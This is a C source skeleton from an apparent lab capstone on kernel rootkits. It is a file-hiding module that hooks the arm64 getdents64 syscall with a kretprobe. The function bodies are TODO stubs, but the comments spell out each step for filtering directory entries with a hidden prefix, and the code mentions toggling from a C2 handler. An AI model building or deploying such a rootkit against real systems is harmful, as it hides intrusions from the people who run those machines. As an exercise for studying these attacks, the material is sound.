/*
 * file_hide.c — File hiding via getdents64 kretprobe
 *
 * Capstone: Kernel Rootkit + Exploitation
 *
 * Hooks __arm64_sys_getdents64 using a kretprobe. The entry handler saves the
 * userspace buffer pointer. The return handler copies the dirent buffer into
 * kernel space, removes entries matching HIDDEN_PREFIX, and copies the filtered
 * buffer back to userspace.
 *
 * Reference: modules/cloak/cloak.c in the QEMU lab
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <asm/ptrace.h>

#include "rootkit.h"

/* Maximum dirent buffer size we'll handle (64 KiB) */
#define MAX_BUF_SIZE (1 << 16)

/* ─── Per-instance data passed from entry to return handler ───────────────── */

/*
 * TODO: Define struct file_hide_data
 *
 * This struct is stored in kretprobe_instance->data. The entry handler
 * saves the userspace buffer pointer here so the return handler can find it.
 *
 * Fields:
 *   struct linux_dirent64 __user *dirp;   // userspace buffer pointer
 */

/* ─── Entry handler ───────────────────────────────────────────────────────── */

/*
 * TODO: Implement file_hide_entry()
 *
 * Called BEFORE __arm64_sys_getdents64 runs. Extract and save the userspace
 * buffer pointer so the return handler can modify the buffer later.
 *
 * AArch64 double pt_regs:
 *   regs->regs[0]  →  pointer to user pt_regs
 *   user_regs->regs[1]  →  dirp (the buffer pointer we need)
 *
 * Steps:
 * 1. Cast ri->data to struct file_hide_data*
 * 2. Get user pt_regs: (struct pt_regs *)regs->regs[0]
 * 3. Save dirp: data->dirp = (void __user *)user_regs->regs[1]
 * 4. Return 0
 *
 * Function signature:
 *   static int file_hide_entry(struct kretprobe_instance *ri,
 *                              struct pt_regs *regs)
 */

/* ─── Return handler ──────────────────────────────────────────────────────── */

/*
 * TODO: Implement file_hide_return()
 *
 * Called AFTER __arm64_sys_getdents64 returns. The dirent buffer is now
 * filled in userspace. Copy it to kernel space, filter out hidden entries,
 * and copy the modified buffer back.
 *
 * Steps:
 * 1. Get return value (byte count): ret = regs_return_value(regs)
 *    - If ret <= 0, nothing to filter — return 0
 * 2. Sanity check: if ret > MAX_BUF_SIZE, skip filtering
 * 3. kmalloc(ret, GFP_ATOMIC) — must use GFP_ATOMIC in probe context
 * 4. copy_from_user(kbuf, data->dirp, ret)
 * 5. Iterate linux_dirent64 entries:
 *    - pos = 0; while (pos < total_len)
 *    - entry = (struct linux_dirent64 *)(kbuf + pos)
 *    - If entry->d_reclen == 0, break (prevent infinite loop)
 *    - If entry->d_name starts with HIDDEN_PREFIX:
 *        memmove(kbuf + pos, kbuf + pos + entry->d_reclen,
 *                total_len - pos - entry->d_reclen)
 *        total_len -= entry->d_reclen
 *        (don't advance pos — next entry slid into this slot)
 *    - Else: pos += entry->d_reclen
 * 6. copy_to_user(data->dirp, kbuf, total_len)
 * 7. Adjust return value: regs->regs[0] = total_len
 * 8. kfree(kbuf)
 * 9. Return 0
 *
 * Function signature:
 *   static int file_hide_return(struct kretprobe_instance *ri,
 *                               struct pt_regs *regs)
 */

/* ─── Kretprobe definition ────────────────────────────────────────────────── */

/*
 * TODO: Define the kretprobe struct
 *
 * static struct kretprobe krp = {
 *     .handler       = file_hide_return,
 *     .entry_handler = file_hide_entry,
 *     .data_size     = sizeof(struct file_hide_data),
 *     .maxactive     = 20,
 *     .kp.symbol_name = "__arm64_sys_getdents64",
 * };
 */

/* ─── State tracking ──────────────────────────────────────────────────────── */

static bool active;

/* ─── Public interface ────────────────────────────────────────────────────── */

/*
 * TODO: Implement file_hide_init()
 *
 * 1. Register the kretprobe: register_kretprobe(&krp)
 * 2. On success, set active = true and log with pr_info
 * 3. On failure, return the error code
 */
int file_hide_init(void)
{
	/* TODO */
	return -ENOSYS;
}

/*
 * TODO: Implement file_hide_exit()
 *
 * 1. If active, unregister the kretprobe: unregister_kretprobe(&krp)
 * 2. Log nmissed count: krp.nmissed (useful for debugging)
 * 3. Set active = false
 */
void file_hide_exit(void)
{
	/* TODO */
}

/*
 * TODO: Implement file_hide_enable() / file_hide_disable()
 *
 * These are called by the C2 handler for toggle commands.
 * enable() registers the kretprobe, disable() unregisters it.
 */
int file_hide_enable(void)
{
	/* TODO */
	return -ENOSYS;
}

void file_hide_disable(void)
{
	/* TODO */
}

bool file_hide_is_active(void)
{
	return active;
}
